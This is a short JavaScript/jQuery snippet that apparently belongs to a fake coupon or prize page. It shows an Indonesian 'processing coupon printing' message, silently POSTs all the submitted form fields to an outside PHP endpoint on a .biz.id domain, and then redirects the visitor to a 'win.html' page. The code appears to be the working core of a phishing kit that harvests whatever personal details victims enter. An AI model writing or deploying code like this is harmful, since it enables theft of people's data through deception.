 
 
      $(document).ready(function(){
    $('#formData').submit(function(e) {
    event.preventDefault();
    
document.getElementById('kirim').innerHTML = "Memproses Cetak Kupon....";


 $.ajax({
 type: 'POST',
 url: 'https://lajukemane.biz.id/burie/redish.php',
 data: $(formData).serialize(),
 datatype: 'text',
 
 complete: function(data) {
            vibr(180);
            console.log('Complete')
   setTimeout(function(){
  window.location.href='win.html'
 
    }, 3000);
        }
    });
 });
    return false;
});   
     
